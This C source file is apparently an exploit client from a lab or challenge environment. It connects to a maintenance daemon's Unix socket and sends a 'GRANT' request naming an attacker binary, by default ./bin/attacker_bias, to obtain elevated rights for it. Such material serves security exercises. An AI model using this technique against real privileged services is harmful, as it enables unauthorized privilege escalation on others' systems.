#include <errno.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

int main(int argc, char **argv) {
    const char *sock_path = "/tmp/cps_maintd.sock";
    char target[PATH_MAX];

    if (argc > 1 && argv[1][0] != '\0') {
        sock_path = argv[1];
    }

    if (argc > 2 && argv[2][0] != '\0') {
        snprintf(target, sizeof(target), "%s", argv[2]);
    } else {
        if (!getcwd(target, sizeof(target))) {
            perror("getcwd");
            return 1;
        }
        size_t len = strlen(target);
        if (len + strlen("/bin/attacker_bias") + 1 >= sizeof(target)) {
            fprintf(stderr, "target path too long\n");
            return 1;
        }
        snprintf(target + len, sizeof(target) - len, "/bin/attacker_bias");
    }

    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) {
        perror("socket");
        return 1;
    }

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    if (strlen(sock_path) >= sizeof(addr.sun_path)) {
        fprintf(stderr, "socket path too long: %s\n", sock_path);
        close(fd);
        return 1;
    }
    snprintf(addr.sun_path, sizeof(addr.sun_path), "%s", sock_path);

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(fd);
        return 1;
    }

    char req[PATH_MAX + 64];
    int n = snprintf(req, sizeof(req), "GRANT %s\n", target);
    if (n < 0 || n >= (int)sizeof(req)) {
        fprintf(stderr, "request overflow\n");
        close(fd);
        return 1;
    }

    if (write(fd, req, (size_t)n) != n) {
        perror("write");
        close(fd);
        return 1;
    }

    char resp[512];
    ssize_t r = read(fd, resp, sizeof(resp) - 1);
    if (r < 0) {
        perror("read");
        close(fd);
        return 1;
    }
    resp[r > 0 ? r : 0] = '\0';
    close(fd);

    if (strncmp(resp, "OK ", 3) == 0) {
        printf("[cps_maint_client] %s", resp);
        return 0;
    }

    fprintf(stderr, "[cps_maint_client] %s", resp[0] ? resp : "ERR empty_response\n");
    return 1;
}
